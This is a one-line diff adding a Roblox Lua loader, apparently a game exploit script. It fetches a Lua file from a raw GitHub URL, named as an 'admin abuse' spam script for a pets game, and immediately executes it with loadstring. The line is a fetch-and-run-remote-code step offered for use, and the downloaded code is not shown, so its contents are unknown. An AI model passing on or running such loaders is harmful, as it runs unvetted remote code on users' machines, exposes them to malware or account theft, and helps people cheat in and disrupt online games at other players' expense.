@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/admin-abuse-pets-universe-spam1-1vd49b8rgydjss.lua"))()
